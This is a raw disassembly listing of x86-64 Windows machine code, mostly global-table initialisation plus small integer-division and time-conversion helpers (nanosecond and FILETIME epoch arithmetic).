    69682622:	48 89 05 17 70 0f 00 	mov    %rax,0xf7017(%rip)        # 0x69779640
    69682629:	48 8d 05 cc ba 00 00 	lea    0xbacc(%rip),%rax        # 0x6968e0fc
    69682630:	48 89 05 11 70 0f 00 	mov    %rax,0xf7011(%rip)        # 0x69779648
    69682637:	48 8d 05 22 70 0f 00 	lea    0xf7022(%rip),%rax        # 0x69779660
    6968263e:	48 89 05 23 71 0f 00 	mov    %rax,0xf7123(%rip)        # 0x69779768
    69682645:	48 8d 05 d4 20 10 00 	lea    0x1020d4(%rip),%rax        # 0x69784720
    6968264c:	48 89 05 1d 70 0f 00 	mov    %rax,0xf701d(%rip)        # 0x69779670
    69682653:	48 8d 05 b2 ba 00 00 	lea    0xbab2(%rip),%rax        # 0x6968e10c
    6968265a:	48 89 05 17 70 0f 00 	mov    %rax,0xf7017(%rip)        # 0x69779678
    69682661:	48 8d 05 28 70 0f 00 	lea    0xf7028(%rip),%rax        # 0x69779690
    69682668:	48 89 05 01 71 0f 00 	mov    %rax,0xf7101(%rip)        # 0x69779770
    6968266f:	48 8d 05 ca 2e 10 00 	lea    0x102eca(%rip),%rax        # 0x69785540
    69682676:	48 89 05 23 70 0f 00 	mov    %rax,0xf7023(%rip)        # 0x697796a0
    6968267d:	48 8d 05 9e ba 00 00 	lea    0xba9e(%rip),%rax        # 0x6968e122
    69682684:	48 89 05 1d 70 0f 00 	mov    %rax,0xf701d(%rip)        # 0x697796a8
    6968268b:	48 8d 05 2e 70 0f 00 	lea    0xf702e(%rip),%rax        # 0x697796c0
    69682692:	48 89 05 df 70 0f 00 	mov    %rax,0xf70df(%rip)        # 0x69779778
    69682699:	48 8d 05 e0 83 0f 00 	lea    0xf83e0(%rip),%rax        # 0x6977aa80
    696826a0:	48 c7 05 35 2d 10 00 	movq   $0x38,0x102d35(%rip)        # 0x697853e0
    696826a7:	38 00 00 00 
    696826ab:	48 c7 05 32 2d 10 00 	movq   $0x8,0x102d32(%rip)        # 0x697853e8
    696826b2:	08 00 00 00 
    696826b6:	66 c7 05 31 2d 10 00 	movw   $0x111,0x102d31(%rip)        # 0x697853f0
    696826bd:	11 01 
    696826bf:	48 c7 05 ee 9c 10 00 	movq   $0x0,0x109cee(%rip)        # 0x6978c3b8
    696826c6:	00 00 00 00 
    696826ca:	48 c7 05 cb 9c 10 00 	movq   $0x8,0x109ccb(%rip)        # 0x6978c3a0
    696826d1:	08 00 00 00 
    696826d5:	48 c7 05 c8 9c 10 00 	movq   $0x8,0x109cc8(%rip)        # 0x6978c3a8
    696826dc:	08 00 00 00 
    696826e0:	66 c7 05 c7 9c 10 00 	movw   $0x319,0x109cc7(%rip)        # 0x6978c3b0
    696826e7:	19 03 
    696826e9:	48 c7 05 44 6f 0f 00 	movq   $0x8,0xf6f44(%rip)        # 0x69779638
    696826f0:	08 00 00 00 
    696826f4:	48 c7 05 39 20 10 00 	movq   $0x0,0x102039(%rip)        # 0x69784738
    696826fb:	00 00 00 00 
    696826ff:	48 c7 05 16 20 10 00 	movq   $0x8,0x102016(%rip)        # 0x69784720
    69682706:	08 00 00 00 
    6968270a:	48 c7 05 13 20 10 00 	movq   $0x8,0x102013(%rip)        # 0x69784728
    69682711:	08 00 00 00 
    69682715:	66 c7 05 12 20 10 00 	movw   $0x319,0x102012(%rip)        # 0x69784730
    6968271c:	19 03 
    6968271e:	c6 05 3b 6f 0f 00 01 	movb   $0x1,0xf6f3b(%rip)        # 0x69779660
    69682725:	48 c7 05 38 6f 0f 00 	movq   $0x10,0xf6f38(%rip)        # 0x69779668
    6968272c:	10 00 00 00 
    69682730:	48 c7 05 1d 2e 10 00 	movq   $0x0,0x102e1d(%rip)        # 0x69785558
    69682737:	00 00 00 00 
    6968273b:	48 c7 05 fa 2d 10 00 	movq   $0x8,0x102dfa(%rip)        # 0x69785540
    69682742:	08 00 00 00 
    69682746:	48 c7 05 f7 2d 10 00 	movq   $0x8,0x102df7(%rip)        # 0x69785548
    6968274d:	08 00 00 00 
    69682751:	66 c7 05 f6 2d 10 00 	movw   $0x319,0x102df6(%rip)        # 0x69785550
    69682758:	19 03 
    6968275a:	c6 05 2f 6f 0f 00 01 	movb   $0x1,0xf6f2f(%rip)        # 0x69779690
    69682761:	48 c7 05 2c 6f 0f 00 	movq   $0x18,0xf6f2c(%rip)        # 0x69779698
    69682768:	18 00 00 00 
    6968276c:	48 c7 05 21 83 0f 00 	movq   $0x0,0xf8321(%rip)        # 0x6977aa98
    69682773:	00 00 00 00 
    69682777:	48 89 05 52 6f 0f 00 	mov    %rax,0xf6f52(%rip)        # 0x697796d0
    6968277e:	48 8d 05 b8 b9 00 00 	lea    0xb9b8(%rip),%rax        # 0x6968e13d
    69682785:	48 89 05 4c 6f 0f 00 	mov    %rax,0xf6f4c(%rip)        # 0x697796d8
    6968278c:	48 8d 05 5d 6f 0f 00 	lea    0xf6f5d(%rip),%rax        # 0x697796f0
    69682793:	48 89 05 e6 6f 0f 00 	mov    %rax,0xf6fe6(%rip)        # 0x69779780
    6968279a:	48 8d 05 7f 9e 10 00 	lea    0x109e7f(%rip),%rax        # 0x6978c620
    696827a1:	48 89 05 58 6f 0f 00 	mov    %rax,0xf6f58(%rip)        # 0x69779700
    696827a8:	48 8d 05 aa b9 00 00 	lea    0xb9aa(%rip),%rax        # 0x6968e159
    696827af:	48 89 05 52 6f 0f 00 	mov    %rax,0xf6f52(%rip)        # 0x69779708
    696827b6:	48 8d 05 63 6f 0f 00 	lea    0xf6f63(%rip),%rax        # 0x69779720
    696827bd:	48 89 05 c4 6f 0f 00 	mov    %rax,0xf6fc4(%rip)        # 0x69779788
    696827c4:	48 8d 05 35 23 10 00 	lea    0x102335(%rip),%rax        # 0x69784b00
    696827cb:	48 89 05 5e 6f 0f 00 	mov    %rax,0xf6f5e(%rip)        # 0x69779730
    696827d2:	48 8d 05 8b b9 00 00 	lea    0xb98b(%rip),%rax        # 0x6968e164
    696827d9:	48 89 05 58 6f 0f 00 	mov    %rax,0xf6f58(%rip)        # 0x69779738
    696827e0:	48 8d 05 79 6f 0f 00 	lea    0xf6f79(%rip),%rax        # 0x69779760
    696827e7:	48 89 05 3a 6e 0f 00 	mov    %rax,0xf6e3a(%rip)        # 0x69779628
    696827ee:	48 8d 05 0b 6e 0f 00 	lea    0xf6e0b(%rip),%rax        # 0x69779600
    696827f5:	48 89 05 04 2c 10 00 	mov    %rax,0x102c04(%rip)        # 0x69785400
    696827fc:	48 8d 05 dd 2b 10 00 	lea    0x102bdd(%rip),%rax        # 0x697853e0
    69682803:	48 89 05 6e 9b 10 00 	mov    %rax,0x109b6e(%rip)        # 0x6978c378
    6968280a:	48 8d 05 05 f1 ff ff 	lea    -0xefb(%rip),%rax        # 0x69681916
    69682811:	48 c7 05 64 82 0f 00 	movq   $0x8,0xf8264(%rip)        # 0x6977aa80
    69682818:	08 00 00 00 
    6968281c:	48 c7 05 61 82 0f 00 	movq   $0x8,0xf8261(%rip)        # 0x6977aa88
    69682823:	08 00 00 00 
    69682827:	66 c7 05 60 82 0f 00 	movw   $0x319,0xf8260(%rip)        # 0x6977aa90
    6968282e:	19 03 
    69682830:	c6 05 89 6e 0f 00 01 	movb   $0x1,0xf6e89(%rip)        # 0x697796c0
    69682837:	48 c7 05 86 6e 0f 00 	movq   $0x20,0xf6e86(%rip)        # 0x697796c8
    6968283e:	20 00 00 00 
    69682842:	c6 05 a7 6e 0f 00 01 	movb   $0x1,0xf6ea7(%rip)        # 0x697796f0
    69682849:	48 c7 05 a4 6e 0f 00 	movq   $0x28,0xf6ea4(%rip)        # 0x697796f8
    69682850:	28 00 00 00 
    69682854:	48 c7 05 b9 22 10 00 	movq   $0x0,0x1022b9(%rip)        # 0x69784b18
    6968285b:	00 00 00 00 
    6968285f:	48 c7 05 96 22 10 00 	movq   $0x8,0x102296(%rip)        # 0x69784b00
    69682866:	08 00 00 00 
    6968286a:	48 c7 05 93 22 10 00 	movq   $0x8,0x102293(%rip)        # 0x69784b08
    69682871:	08 00 00 00 
    69682875:	66 c7 05 92 22 10 00 	movw   $0x328,0x102292(%rip)        # 0x69784b10
    6968287c:	28 03 
    6968287e:	c6 05 9b 6e 0f 00 01 	movb   $0x1,0xf6e9b(%rip)        # 0x69779720
    69682885:	48 c7 05 98 6e 0f 00 	movq   $0x30,0xf6e98(%rip)        # 0x69779728
    6968288c:	30 00 00 00 
    69682890:	48 c7 05 85 6d 0f 00 	movq   $0x6,0xf6d85(%rip)        # 0x69779620
    69682897:	06 00 00 00 
    6968289b:	c6 05 5e 6d 0f 00 02 	movb   $0x2,0xf6d5e(%rip)        # 0x69779600
    696828a2:	48 c7 05 b3 9a 10 00 	movq   $0x8,0x109ab3(%rip)        # 0x6978c360
    696828a9:	08 00 00 00 
    696828ad:	48 c7 05 b0 9a 10 00 	movq   $0x8,0x109ab0(%rip)        # 0x6978c368
    696828b4:	08 00 00 00 
    696828b8:	c6 05 b1 9a 10 00 16 	movb   $0x16,0x109ab1(%rip)        # 0x6978c370
    696828bf:	48 89 05 ca 9a 10 00 	mov    %rax,0x109aca(%rip)        # 0x6978c390
    696828c6:	c3                   	ret
    696828c7:	48 8d 05 b2 9b 10 00 	lea    0x109bb2(%rip),%rax        # 0x6978c480
    696828ce:	c6 05 bb 28 10 00 18 	movb   $0x18,0x1028bb(%rip)        # 0x69785190
    696828d5:	48 89 05 bc 28 10 00 	mov    %rax,0x1028bc(%rip)        # 0x69785198
    696828dc:	48 8d 05 8f 41 00 00 	lea    0x418f(%rip),%rax        # 0x69686a72
    696828e3:	48 c7 05 92 28 10 00 	movq   $0x8,0x102892(%rip)        # 0x69785180
    696828ea:	08 00 00 00 
    696828ee:	48 c7 05 8f 28 10 00 	movq   $0x8,0x10288f(%rip)        # 0x69785188
    696828f5:	08 00 00 00 
    696828f9:	48 89 05 b0 28 10 00 	mov    %rax,0x1028b0(%rip)        # 0x697851b0
    69682900:	c3                   	ret
    69682901:	48 ff 25 78 9e 10 00 	rex.W jmp *0x109e78(%rip)        # 0x6978c780
    69682908:	48 8d 0d d1 81 0f 00 	lea    0xf81d1(%rip),%rcx        # 0x6977aae0
    6968290f:	c6 05 3a 9e 10 00 12 	movb   $0x12,0x109e3a(%rip)        # 0x6978c750
    69682916:	48 8d 15 d3 6b 0f 00 	lea    0xf6bd3(%rip),%rdx        # 0x697794f0
    6968291d:	48 89 0d dc 6b 0f 00 	mov    %rcx,0xf6bdc(%rip)        # 0x69779500
    69682924:	48 8d 0d f5 6b 0f 00 	lea    0xf6bf5(%rip),%rcx        # 0x69779520
    6968292b:	48 89 15 1e 6b 0f 00 	mov    %rdx,0xf6b1e(%rip)        # 0x69779450
    69682932:	48 89 0d 1f 6b 0f 00 	mov    %rcx,0xf6b1f(%rip)        # 0x69779458
    69682939:	48 83 c1 30          	add    $0x30,%rcx
    6968293d:	48 8d 15 27 b8 00 00 	lea    0xb827(%rip),%rdx        # 0x6968e16b
    69682944:	48 89 0d 95 1d 10 00 	mov    %rcx,0x101d95(%rip)        # 0x697846e0
    6968294b:	48 89 15 b6 6b 0f 00 	mov    %rdx,0xf6bb6(%rip)        # 0x69779508
    69682952:	48 8d 0d be ef ff ff 	lea    -0x1042(%rip),%rcx        # 0x69681917
    69682959:	48 8d 15 40 f0 0f 00 	lea    0xff040(%rip),%rdx        # 0x697819a0
    69682960:	48 89 0d 09 27 10 00 	mov    %rcx,0x102709(%rip)        # 0x69785070
    69682967:	48 8d 05 22 6b 0f 00 	lea    0xf6b22(%rip),%rax        # 0x69779490
    6968296e:	48 89 15 63 1d 10 00 	mov    %rdx,0x101d63(%rip)        # 0x697846d8
    69682975:	48 8d 0d f6 b7 00 00 	lea    0xb7f6(%rip),%rcx        # 0x6968e172
    6968297c:	48 89 05 5d 6c 0f 00 	mov    %rax,0xf6c5d(%rip)        # 0x697795e0
    69682983:	48 8d 15 36 1d 10 00 	lea    0x101d36(%rip),%rdx        # 0x697846c0
    6968298a:	48 c7 05 ab 9d 10 00 	movq   $0x28,0x109dab(%rip)        # 0x6978c740
    69682991:	28 00 00 00 
    69682995:	48 8d 05 84 27 10 00 	lea    0x102784(%rip),%rax        # 0x69785120
    6968299c:	48 89 15 b5 26 10 00 	mov    %rdx,0x1026b5(%rip)        # 0x69785058
    696829a3:	48 c7 05 9a 9d 10 00 	movq   $0x8,0x109d9a(%rip)        # 0x6978c748
    696829aa:	08 00 00 00 
    696829ae:	48 8d 15 8b 26 10 00 	lea    0x10268b(%rip),%rdx        # 0x69785040
    696829b5:	48 c7 05 98 9d 10 00 	movq   $0x0,0x109d98(%rip)        # 0x6978c758
    696829bc:	00 00 00 00 
    696829c0:	48 c7 05 55 27 10 00 	movq   $0x10,0x102755(%rip)        # 0x69785120
    696829c7:	10 00 00 00 
    696829cb:	48 c7 05 52 27 10 00 	movq   $0x8,0x102752(%rip)        # 0x69785128
    696829d2:	08 00 00 00 
    696829d6:	c6 05 53 27 10 00 12 	movb   $0x12,0x102753(%rip)        # 0x69785130
    696829dd:	48 c7 05 50 27 10 00 	movq   $0x0,0x102750(%rip)        # 0x69785138
    696829e4:	00 00 00 00 
    696829e8:	48 c7 05 05 81 0f 00 	movq   $0x0,0xf8105(%rip)        # 0x6977aaf8
    696829ef:	00 00 00 00 
    696829f3:	48 c7 05 e2 80 0f 00 	movq   $0x8,0xf80e2(%rip)        # 0x6977aae0
    696829fa:	08 00 00 00 
    696829fe:	48 c7 05 df 80 0f 00 	movq   $0x8,0xf80df(%rip)        # 0x6977aae8
    69682a05:	08 00 00 00 
    69682a09:	66 c7 05 de 80 0f 00 	movw   $0x31a,0xf80de(%rip)        # 0x6977aaf0
    69682a10:	1a 03 
    69682a12:	c6 05 d7 6a 0f 00 01 	movb   $0x1,0xf6ad7(%rip)        # 0x697794f0
    69682a19:	48 c7 05 d4 6a 0f 00 	movq   $0x0,0xf6ad4(%rip)        # 0x697794f8
    69682a20:	00 00 00 00 
    69682a24:	48 c7 05 91 1c 10 00 	movq   $0x8,0x101c91(%rip)        # 0x697846c0
    69682a2b:	08 00 00 00 
    69682a2f:	48 c7 05 8e 1c 10 00 	movq   $0x8,0x101c8e(%rip)        # 0x697846c8
    69682a36:	08 00 00 00 
    69682a3a:	66 c7 05 8d 1c 10 00 	movw   $0x111,0x101c8d(%rip)        # 0x697846d0
    69682a41:	11 01 
    69682a43:	48 c7 05 22 6b 0f 00 	movq   $0x0,0xf6b22(%rip)        # 0x69779570
    69682a4a:	00 00 00 00 
    69682a4e:	c6 05 fb 6a 0f 00 02 	movb   $0x2,0xf6afb(%rip)        # 0x69779550
    69682a55:	48 c7 05 e0 25 10 00 	movq   $0x8,0x1025e0(%rip)        # 0x69785040
    69682a5c:	08 00 00 00 
    69682a60:	48 c7 05 dd 25 10 00 	movq   $0x8,0x1025dd(%rip)        # 0x69785048
    69682a67:	08 00 00 00 
    69682a6b:	c6 05 de 25 10 00 16 	movb   $0x16,0x1025de(%rip)        # 0x69785050
    69682a72:	c6 05 a7 6a 0f 00 01 	movb   $0x1,0xf6aa7(%rip)        # 0x69779520
    69682a79:	48 c7 05 a4 6a 0f 00 	movq   $0x8,0xf6aa4(%rip)        # 0x69779528
    69682a80:	08 00 00 00 
    69682a84:	48 89 0d ad 6a 0f 00 	mov    %rcx,0xf6aad(%rip)        # 0x69779538
    69682a8b:	48 8d 0d 2e 6a 0f 00 	lea    0xf6a2e(%rip),%rcx        # 0x697794c0
    69682a92:	48 89 0d a7 26 10 00 	mov    %rcx,0x1026a7(%rip)        # 0x69785140
    69682a99:	48 81 c1 c0 00 00 00 	add    $0xc0,%rcx
    69682aa0:	48 89 05 f9 69 0f 00 	mov    %rax,0xf69f9(%rip)        # 0x697794a0
    69682aa7:	48 89 05 e2 6a 0f 00 	mov    %rax,0xf6ae2(%rip)        # 0x69779590
    69682aae:	48 8d 05 da b6 00 00 	lea    0xb6da(%rip),%rax        # 0x6968e18f
    69682ab5:	48 89 05 dc 6a 0f 00 	mov    %rax,0xf6adc(%rip)        # 0x69779598
    69682abc:	48 8d 41 30          	lea    0x30(%rcx),%rax
    69682ac0:	48 89 05 29 6b 0f 00 	mov    %rax,0xf6b29(%rip)        # 0x697795f0
    69682ac7:	48 8d 05 b2 99 10 00 	lea    0x1099b2(%rip),%rax        # 0x6978c480
    69682ace:	48 89 05 eb 6a 0f 00 	mov    %rax,0xf6aeb(%rip)        # 0x697795c0
    69682ad5:	48 8d 05 cc b6 00 00 	lea    0xb6cc(%rip),%rax        # 0x6968e1a8
    69682adc:	48 89 05 e5 6a 0f 00 	mov    %rax,0xf6ae5(%rip)        # 0x697795c8
    69682ae3:	48 8d 05 f6 6a 0f 00 	lea    0xf6af6(%rip),%rax        # 0x697795e0
    69682aea:	48 89 05 97 69 0f 00 	mov    %rax,0xf6997(%rip)        # 0x69779488
    69682af1:	48 8d 81 e0 fe ff ff 	lea    -0x120(%rcx),%rax
    69682af8:	48 89 15 31 6a 0f 00 	mov    %rdx,0xf6a31(%rip)        # 0x69779530
    69682aff:	48 8d 15 4a 69 0f 00 	lea    0xf694a(%rip),%rdx        # 0x69779450
    69682b06:	48 89 05 53 9c 10 00 	mov    %rax,0x109c53(%rip)        # 0x6978c760
    69682b0d:	48 8d 05 2c 9c 10 00 	lea    0x109c2c(%rip),%rax        # 0x6978c740
    69682b14:	48 89 15 cd 69 0f 00 	mov    %rdx,0xf69cd(%rip)        # 0x697794e8
    69682b1b:	48 8d 15 57 b6 00 00 	lea    0xb657(%rip),%rdx        # 0x6968e179
    69682b22:	48 89 05 2f 9a 10 00 	mov    %rax,0x109a2f(%rip)        # 0x6978c558
    69682b29:	48 8d 05 90 3f 00 00 	lea    0x3f90(%rip),%rax        # 0x69686ac0
    69682b30:	48 c7 05 a5 69 0f 00 	movq   $0x2,0xf69a5(%rip)        # 0x697794e0
    69682b37:	02 00 00 00 
    69682b3b:	c6 05 7e 69 0f 00 02 	movb   $0x2,0xf697e(%rip)        # 0x697794c0
    69682b42:	c6 05 47 69 0f 00 01 	movb   $0x1,0xf6947(%rip)        # 0x69779490
    69682b49:	48 c7 05 44 69 0f 00 	movq   $0x0,0xf6944(%rip)        # 0x69779498
    69682b50:	00 00 00 00 
    69682b54:	48 89 15 4d 69 0f 00 	mov    %rdx,0xf694d(%rip)        # 0x697794a8
    69682b5b:	48 89 0d 86 6a 0f 00 	mov    %rcx,0xf6a86(%rip)        # 0x697795e8
    69682b62:	c6 05 17 6a 0f 00 01 	movb   $0x1,0xf6a17(%rip)        # 0x69779580
    69682b69:	48 c7 05 14 6a 0f 00 	movq   $0x10,0xf6a14(%rip)        # 0x69779588
    69682b70:	10 00 00 00 
    69682b74:	c6 05 35 6a 0f 00 01 	movb   $0x1,0xf6a35(%rip)        # 0x697795b0
    69682b7b:	48 c7 05 32 6a 0f 00 	movq   $0x20,0xf6a32(%rip)        # 0x697795b8
    69682b82:	20 00 00 00 
    69682b86:	48 c7 05 ef 68 0f 00 	movq   $0x3,0xf68ef(%rip)        # 0x69779480
    69682b8d:	03 00 00 00 
    69682b91:	c6 05 c8 68 0f 00 02 	movb   $0x2,0xf68c8(%rip)        # 0x69779460
    69682b98:	48 c7 05 9d 99 10 00 	movq   $0x8,0x10999d(%rip)        # 0x6978c540
    69682b9f:	08 00 00 00 
    69682ba3:	48 c7 05 9a 99 10 00 	movq   $0x8,0x10999a(%rip)        # 0x6978c548
    69682baa:	08 00 00 00 
    69682bae:	c6 05 9b 99 10 00 16 	movb   $0x16,0x10999b(%rip)        # 0x6978c550
    69682bb5:	48 89 05 b4 99 10 00 	mov    %rax,0x1099b4(%rip)        # 0x6978c570
    69682bbc:	c3                   	ret
    69682bbd:	31 d2                	xor    %edx,%edx
    69682bbf:	48 8b 01             	mov    (%rcx),%rax
    69682bc2:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69682bc6:	48 85 c0             	test   %rax,%rax
    69682bc9:	79 06                	jns    0x69682bd1
    69682bcb:	48 85 c9             	test   %rcx,%rcx
    69682bce:	0f 9f c2             	setg   %dl
    69682bd1:	0f b6 d2             	movzbl %dl,%edx
    69682bd4:	48 01 d0             	add    %rdx,%rax
    69682bd7:	c3                   	ret
    69682bd8:	48 83 ec 38          	sub    $0x38,%rsp
    69682bdc:	49 89 d2             	mov    %rdx,%r10
    69682bdf:	49 89 c9             	mov    %rcx,%r9
    69682be2:	ba 10 00 00 00       	mov    $0x10,%edx
    69682be7:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
    69682bec:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    69682bf1:	e8 d6 ed ff ff       	call   0x696819cc
    69682bf6:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
    69682bfb:	b9 00 ca 9a 3b       	mov    $0x3b9aca00,%ecx
    69682c00:	4c 89 c0             	mov    %r8,%rax
    69682c03:	48 99                	cqto
    69682c05:	48 f7 f9             	idiv   %rcx
    69682c08:	4c 01 d0             	add    %r10,%rax
    69682c0b:	48 85 d2             	test   %rdx,%rdx
    69682c0e:	79 0a                	jns    0x69682c1a
    69682c10:	48 81 c2 00 ca 9a 3b 	add    $0x3b9aca00,%rdx
    69682c17:	48 ff c8             	dec    %rax
    69682c1a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69682c1f:	4c 89 c8             	mov    %r9,%rax
    69682c22:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    69682c27:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
    69682c2c:	41 0f 11 01          	movups %xmm0,(%r9)
    69682c30:	48 83 c4 38          	add    $0x38,%rsp
    69682c34:	c3                   	ret
    69682c35:	56                   	push   %rsi
    69682c36:	53                   	push   %rbx
    69682c37:	48 83 ec 48          	sub    $0x48,%rsp
    69682c3b:	4c 8b 0a             	mov    (%rdx),%r9
    69682c3e:	4d 8b 50 08          	mov    0x8(%r8),%r10
    69682c42:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
    69682c46:	ba 10 00 00 00       	mov    $0x10,%edx
    69682c4b:	49 8b 30             	mov    (%r8),%rsi
    69682c4e:	49 89 cb             	mov    %rcx,%r11
    69682c51:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
    69682c56:	e8 71 ed ff ff       	call   0x696819cc
    69682c5b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    69682c60:	4c 89 ca             	mov    %r9,%rdx
    69682c63:	4c 29 d3             	sub    %r10,%rbx
    69682c66:	48 29 f2             	sub    %rsi,%rdx
    69682c69:	49 89 d8             	mov    %rbx,%r8
    69682c6c:	e8 67 ff ff ff       	call   0x69682bd8
    69682c71:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
    69682c76:	4c 89 d8             	mov    %r11,%rax
    69682c79:	41 0f 11 03          	movups %xmm0,(%r11)
    69682c7d:	48 83 c4 48          	add    $0x48,%rsp
    69682c81:	5b                   	pop    %rbx
    69682c82:	5e                   	pop    %rsi
    69682c83:	c3                   	ret
    69682c84:	48 89 c8             	mov    %rcx,%rax
    69682c87:	c3                   	ret
    69682c88:	89 c8                	mov    %ecx,%eax
    69682c8a:	c3                   	ret
    69682c8b:	48 83 ec 38          	sub    $0x38,%rsp
    69682c8f:	49 89 c9             	mov    %rcx,%r9
    69682c92:	49 89 d2             	mov    %rdx,%r10
    69682c95:	ba 10 00 00 00       	mov    $0x10,%edx
    69682c9a:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
    69682c9f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    69682ca4:	e8 23 ed ff ff       	call   0x696819cc
    69682ca9:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
    69682cae:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
    69682cb3:	4c 89 c8             	mov    %r9,%rax
    69682cb6:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
    69682cbb:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
    69682cc0:	41 0f 11 01          	movups %xmm0,(%r9)
    69682cc4:	48 83 c4 38          	add    $0x38,%rsp
    69682cc8:	c3                   	ret
    69682cc9:	48 89 c8             	mov    %rcx,%rax
    69682ccc:	49 89 d0             	mov    %rdx,%r8
    69682ccf:	48 99                	cqto
    69682cd1:	49 f7 f8             	idiv   %r8
    69682cd4:	48 85 d2             	test   %rdx,%rdx
    69682cd7:	48 89 c1             	mov    %rax,%rcx
    69682cda:	7e 07                	jle    0x69682ce3
    69682cdc:	4d 85 c0             	test   %r8,%r8
    69682cdf:	79 0d                	jns    0x69682cee
    69682ce1:	eb 07                	jmp    0x69682cea
    69682ce3:	74 09                	je     0x69682cee
    69682ce5:	4d 85 c0             	test   %r8,%r8
    69682ce8:	7e 04                	jle    0x69682cee
    69682cea:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
    69682cee:	c3                   	ret
    69682cef:	48 89 c8             	mov    %rcx,%rax
    69682cf2:	49 89 d0             	mov    %rdx,%r8
    69682cf5:	48 99                	cqto
    69682cf7:	49 f7 f8             	idiv   %r8
    69682cfa:	48 85 d2             	test   %rdx,%rdx
    69682cfd:	48 89 d0             	mov    %rdx,%rax
    69682d00:	7e 07                	jle    0x69682d09
    69682d02:	4d 85 c0             	test   %r8,%r8
    69682d05:	79 0d                	jns    0x69682d14
    69682d07:	eb 07                	jmp    0x69682d10
    69682d09:	74 09                	je     0x69682d14
    69682d0b:	4d 85 c0             	test   %r8,%r8
    69682d0e:	7e 04                	jle    0x69682d14
    69682d10:	4a 8d 04 02          	lea    (%rdx,%r8,1),%rax
    69682d14:	c3                   	ret
    69682d15:	48 83 ec 48          	sub    $0x48,%rsp
    69682d19:	49 89 cb             	mov    %rcx,%r11
    69682d1c:	49 89 d1             	mov    %rdx,%r9
    69682d1f:	ba 10 00 00 00       	mov    $0x10,%edx
    69682d24:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
    69682d29:	e8 9e ec ff ff       	call   0x696819cc
    69682d2e:	ba 80 96 98 00       	mov    $0x989680,%edx
    69682d33:	4c 89 c9             	mov    %r9,%rcx
    69682d36:	e8 b4 ff ff ff       	call   0x69682cef
    69682d3b:	ba 80 96 98 00       	mov    $0x989680,%edx
    69682d40:	48 b9 00 80 c1 2a 21 	movabs $0xfe624e212ac18000,%rcx
    69682d47:	4e 62 fe 
    69682d4a:	4c 01 c9             	add    %r9,%rcx
    69682d4d:	49 89 c2             	mov    %rax,%r10
    69682d50:	e8 74 ff ff ff       	call   0x69682cc9
    69682d55:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    69682d5a:	4d 6b c2 64          	imul   $0x64,%r10,%r8
    69682d5e:	48 89 c2             	mov    %rax,%rdx
    69682d61:	e8 25 ff ff ff       	call   0x69682c8b
    69682d66:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
    69682d6b:	4c 89 d8             	mov    %r11,%rax
    69682d6e:	41 0f 11 03          	movups %xmm0,(%r11)
    69682d72:	48 83 c4 48          	add    $0x48,%rsp
    69682d76:	c3                   	ret
    69682d77:	53                   	push   %rbx
    69682d78:	48 83 ec 50          	sub    $0x50,%rsp
    69682d7c:	ba 10 00 00 00       	mov    $0x10,%edx
    69682d81:	48 89 cb             	mov    %rcx,%rbx
    69682d84:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
    69682d89:	e8 3e ec ff ff       	call   0x696819cc
    69682d8e:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
    69682d93:	ff 15 97 9b 10 00    	call   *0x109b97(%rip)        # 0x6978c930
    69682d99:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    69682d9e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    69682da3:	e8 6d ff ff ff       	call   0x69682d15
    69682da8:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
    69682dad:	48 89 d8             	mov    %rbx,%rax
    69682db0:	0f 11 03             	movups %xmm0,(%rbx)
    69682db3:	48 83 c4 50          	add    $0x50,%rsp
    69682db7:	5b                   	pop    %rbx
    69682db8:	c3                   	ret
    69682db9:	48 ff 25 5c b4 10 00 	rex.W jmp *0x10b45c(%rip)        # 0x6978e21c
    69682dc0:	48 83 ec 28          	sub    $0x28,%rsp
    69682dc4:	e8 35 eb ff ff       	call   0x696818fe
    69682dc9:	48 89 c1             	mov    %rax,%rcx
    69682dcc:	48 83 c4 28          	add    $0x28,%rsp
    69682dd0:	48 ff 25 6d b4 10 00 	rex.W jmp *0x10b46d(%rip)        # 0x6978e244
    69682dd7:	48 83 ec 28          	sub    $0x28,%rsp
    69682ddb:	48 8d 0d 1e bd 00 00 	lea    0xbd1e(%rip),%rcx        # 0x6968eb00
    69682de2:	31 d2                	xor    %edx,%edx
    69682de4:	e8 d7 ff ff ff       	call   0x69682dc0
    69682de9:	48 85 c0             	test   %rax,%rax
    69682dec:	48 89 05 cd 7b 0f 00 	mov    %rax,0xf7bcd(%rip)        # 0x6977a9c0
    69682df3:	74 17                	je     0x69682e0c
    69682df5:	48 8d 15 b1 b3 00 00 	lea    0xb3b1(%rip),%rdx        # 0x6968e1ad
    69682dfc:	48 89 c1             	mov    %rax,%rcx
    69682dff:	ff 15 17 b4 10 00    	call   *0x10b417(%rip)        # 0x6978e21c
    69682e05:	48 89 05 14 62 0f 00 	mov    %rax,0xf6214(%rip)        # 0x69779020
    69682e0c:	48 83 c4 28          	add    $0x28,%rsp
    69682e10:	c3                   	ret
    69682e11:	41 57                	push   %r15
    69682e13:	41 56                	push   %r14
    69682e15:	41 55                	push   %r13
    69682e17:	41 54                	push   %r12
    69682e19:	55                   	push   %rbp
    69682e1a:	57                   	push   %rdi
    69682e1b:	56                   	push   %rsi
    69682e1c:	53                   	push   %rbx
